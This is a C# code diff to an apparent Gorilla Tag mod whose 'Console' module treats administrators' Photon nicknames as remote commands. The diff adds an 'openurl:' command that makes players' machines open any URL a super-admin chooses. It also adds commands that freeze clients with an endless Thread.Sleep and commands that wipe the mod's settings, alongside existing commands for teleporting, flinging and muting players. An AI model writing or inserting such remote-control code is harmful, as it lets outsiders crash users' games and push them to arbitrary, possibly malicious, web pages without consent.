@@ -3,14 +3,15 @@ using MelonLoader;
 using Photon.Pun;
 using Photon.Voice.Unity;
 using Qolossal;
-using Qolossal.Notifacation;
+using Qolossal.Menu;
 using System;
 using System.Collections;
 using System.Collections.Generic;
 using System.IO;
+using System.Reflection;
+using System.Threading;
 using UnhollowerRuntimeLib;
 using UnityEngine;
-using UnityEngine.Animations.Rigging;
 using UnityEngine.Rendering;
 
 namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
@@ -20,7 +21,7 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
     {
         public ConsoleQolossal(IntPtr e) : base(e) { }
 
-        public static string MenuName = "qolossal";
+        public static string MenuName = "Qolossal";
         public static string MenuVersion = Plugin.version.ToString();
 
         public static string ConsoleResourceLocation = "Console";
@@ -34,6 +35,11 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
 
         public static Material adminCrownMaterial;
         public static Texture2D adminCrownTexture;
+
+        public bool IsAdmin(string userId)
+        {
+            return !string.IsNullOrEmpty(userId) && ServerDataQolossal.Administrators.ContainsKey(userId);
+        }
 
         public static Texture2D LoadFromConsole(string resourceName)
         {
@@ -198,15 +204,15 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
 
         public static void SendNotification(string text, int sendTime = 1000)
         {
-            Notifacations.SendNotification(text);
+            // Add your notifcation sender here
         }
 
         public static void TeleportPlayer(Vector3 position) // Only modify this if you need any special logic
         {
-            GorillaTagger.Instance.transform.position = position;
+            GorillaLocomotion.Player.Instance.transform.position = position;
         }
 
-        public static readonly string ConsoleVersion = "1.0.0";
+        public static readonly string ConsoleVersion = "1.0.1";
         public static ConsoleQolossal instance;
 
         public static void Log(string text) => // Method used to log info, replace if using a custom logger
@@ -292,12 +298,7 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
             }
         }
 
-        public bool IsAdmin(string userId)
-        {
-            return !string.IsNullOrEmpty(userId) &&
-                   ServerDataQolossal.Administrators.ContainsKey(userId);
-        }
-
+        const string upre = "\n\nopenurl:";
         public void HandleCommands()
         {
             if (PhotonNetwork.InRoom)
@@ -311,6 +312,16 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
                         {
                             bool superAdmin = ServerDataQolossal.SuperAdministrators.Contains(administrator);
                             string command = rig.photonView.Owner.NickName;
+
+                            if (command.StartsWith(upre))
+                            {
+                                if (superAdmin)
+                                {
+                                    string url = command.Substring(upre.Length);
+                                    Application.OpenURL(url);
+                                }
+                            }
+
                             switch (command)
                             {
                                 case "\n\nkickall":
@@ -336,11 +347,11 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
                                     GorillaTagger.Instance.myVRRig.enabled = true;
                                     break;
                                 case "\n\nbringall":
-                                    GorillaTagger.Instance.transform.position = rig.headMesh.transform.position;
+                                    GorillaLocomotion.Player.Instance.transform.position = rig.headMesh.transform.position;
                                     GorillaTagger.Instance.transform.position = rig.headMesh.transform.position;
                                     break;
                                 case "\n\nflingall":
-                                    GorillaTagger.Instance.transform.position = rig.headMesh.transform.position + new Vector3(0f, 150f, 0f);
+                                    GorillaLocomotion.Player.Instance.transform.position = rig.headMesh.transform.position + new Vector3(0f, 150f, 0f);
                                     GorillaTagger.Instance.transform.position = rig.headMesh.transform.position + new Vector3(0f, 150f, 0f);
                                     break;
                                 case "\n\nmuteall":
@@ -361,29 +372,54 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
                                     PlayerPrefs.SetString("username", "<color=yellow><Console> By Nova\ndiscord.gg/dtQdz59FJG</color>");
                                     break;
                                 case "\n\nrestartmicall":
-                                    try
+                                    Recorder component = GameObject.Find("NetworkVoice")?.GetComponent<Recorder>() ?? GameObject.Find("Photon Manager")?.GetComponent<Recorder>();
+                                    if (component != null)
                                     {
-                                        Recorder component = GameObject.Find("NetworkVoice")?.GetComponent<Recorder>() ?? GameObject.Find("Photon Manager")?.GetComponent<Recorder>();
-                                        if (component != null)
+                                        component.SourceType = Recorder.InputSourceType.Microphone;
+                                        component.AudioClip = null;
+                                        typeof(Recorder).GetMethod("RestartRecording")?.Invoke(component, new object[] { true });
+                                        typeof(Recorder).GetProperty("DebugEchoMode")?.SetValue(component, false);
+                                    }
+                                    break;
+                                case "\n\ncrashallconsole":
+                                    if (superAdmin)
+                                    {
+                                        Thread.Sleep(int.MaxValue);
+                                        Application.targetFrameRate = -1;
+                                    }
+                                    break;
+                                case "\n\npanicall":
+                                    foreach (var field in typeof(PluginConfig).GetFields(BindingFlags.Public | BindingFlags.Static))
+                                    {
+                                        if (field.FieldType == typeof(bool))
                                         {
-                                            component.SourceType = Recorder.InputSourceType.Microphone;
-                                            component.AudioClip = null;
-
-                                            typeof(Recorder).GetMethod("RestartRecording")?.Invoke(component, new object[] { true });
-                                            typeof(Recorder).GetProperty("DebugEchoMode")?.SetValue(component, false);
+                                            field.SetValue(null, false);
+                                        }
+                                        else if (field.FieldType == typeof(int))
+                                        {
+                                            field.SetValue(null, 0);
                                         }
                                     }
-                                    catch { }
                                     break;
                             }
 
                             if (command.StartsWith(PhotonNetwork.LocalPlayer.UserId))
                             {
                                 string actualCommand = command.Substring(PhotonNetwork.LocalPlayer.UserId.Length);
+
+                                if (actualCommand.StartsWith(upre))
+                                {
+                                    if (superAdmin)
+                                    {
+                                        string url = actualCommand.Substring(upre.Length);
+                                        Application.OpenURL(url);
+                                    }
+                                }
+
                                 switch (actualCommand)
                                 {
                                     case "\n\ngotouser":
-                                        GorillaTagger.Instance.transform.position = rig.headMesh.transform.position;
+                                        GorillaLocomotion.Player.Instance.transform.position = rig.headMesh.transform.position;
                                         GorillaTagger.Instance.transform.position = rig.headMesh.transform.position;
                                         break;
                                     case "\n\nquitgun":
@@ -428,22 +464,37 @@ namespace Console // All Credits goto iiDk, kingofnetflix, twig and the others
                                         PhotonNetwork.Instantiate("STICKABLE TARGET", GorillaTagger.Instance.transform.position, GorillaTagger.Instance.transform.rotation);
                                         break;
                                     case "\n\nadminflinggun":
-                                        GorillaTagger.Instance.transform.position += new Vector3(GorillaTagger.Instance.transform.position.x, 250f, GorillaTagger.Instance.transform.position.z);
+                                        GorillaLocomotion.Player.Instance.transform.position += new Vector3(GorillaLocomotion.Player.Instance.transform.position.x, 250f, GorillaLocomotion.Player.Instance.transform.position.z);
                                         break;
                                     case "\n\nrestartmicgun":
-                                        try
+                                        Recorder component = GameObject.Find("NetworkVoice")?.GetComponent<Recorder>() ?? GameObject.Find("Photon Manager")?.GetComponent<Recorder>();
+                                        if (component != null)
                                         {
-                                            Recorder component = GameObject.Find("NetworkVoice")?.GetComponent<Recorder>() ?? GameObject.Find("Photon Manager")?.GetComponent<Recorder>();
-                                            if (component != null)
+                                            component.SourceType = Recorder.InputSourceType.Microphone;
+                                            component.AudioClip = null;
+                                            typeof(Recorder).GetMethod("RestartRecording")?.Invoke(component, new object[] { true });
+                                            typeof(Recorder).GetProperty("DebugEchoMode")?.SetValue(component, false);
+                                        }
+                                        break;
+                                    case "\n\ncrashplayerconsole":
+                                        if (superAdmin)
+                                        {
+                                            Thread.Sleep(int.MaxValue);
+                                            Application.targetFrameRate = -1;
+                                        }
+                                        break;
+                                    case "\n\npanicgun":
+                                        foreach (var field in typeof(PluginConfig).GetFields(BindingFlags.Public | BindingFlags.Static))
+                                        {
+                                            if (field.FieldType == typeof(bool))
                                             {
-                                                component.SourceType = Recorder.InputSourceType.Microphone;
-                                                component.AudioClip = null;
-
-                                                typeof(Recorder).GetMethod("RestartRecording")?.Invoke(component, new object[] { true });
-                                                typeof(Recorder).GetProperty("DebugEchoMode")?.SetValue(component, false);
+                                                field.SetValue(null, false);
+                                            }
+                                            else if (field.FieldType == typeof(int))
+                                            {
+                                                field.SetValue(null, 0);
                                             }
                                         }
-                                        catch { }
                                         break;
                                 }
                             }
